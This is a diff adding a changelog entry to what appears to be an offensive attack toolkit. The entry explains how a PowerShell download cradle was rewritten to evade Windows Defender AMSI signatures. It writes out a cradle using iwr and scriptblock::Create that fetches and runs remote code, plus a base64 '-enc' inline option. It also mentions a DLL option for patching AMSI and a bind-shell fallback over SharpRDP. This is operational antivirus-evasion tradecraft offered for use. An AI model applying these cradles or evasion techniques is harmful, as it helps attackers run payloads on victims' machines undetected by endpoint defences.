@@ -5,6 +5,30 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-06-07c] fix(evasion): replace iex+downloadstring cradle with iwr+scriptblock and -enc options
+
+**Problem:** Option [2] "Clean serve" used `powershell -c "iex(new-object net.webclient).downloadstring(...)"`.
+Windows Defender AMSI scans the entire `-c "..."` argument as a scriptblock BEFORE execution begins.
+The `iex`, `new-object net.webclient`, and `downloadstring` triple is a direct static AMSI signature
+— Defender kills the process at argument parse time, before the command ever runs. The pipe script
+content is irrelevant; the cradle command itself is the signature.
+
+**Fix:** Replaced options [2]/[3] with two new alternatives and demoted DLL serve to [4]:
+
+- **[2] IWR serve** — `&([scriptblock]::Create((iwr 'url' -UseBasicParsing).Content))` — avoids
+  `iex`, `new-object`, `WebClient`, and `DownloadString`. No static AMSI signature for this pattern.
+  Requires `serve` running.
+
+- **[3] Enc serve** — `powershell.exe -enc <base64-utf16le>` — embeds the lite InlinePS directly
+  as a base64 command. No network call from target, no `iex` anywhere. AMSI sees encoded data in
+  the argument (no static match) and when decoded, the lite script has no bypass signatures either.
+  Does NOT require `serve`.
+
+- **[4] DLL serve** (demoted) — kept for environments where AMSI patching is needed before any
+  PS execution; now uses `iwr` instead of `iex+downloadstring` for the fetch step too.
+
+Also updated SharpRDP fallback cradle (bind-shell only) to use `iwr` instead of `iex+downloadstring`.
+
 ## [2026-06-07b] fix(evasion): strip bypass code from serve-delivered pipe script
 
 **Problem:** After switching the cradle to DLL-load (no AMSI signatures in command line), process
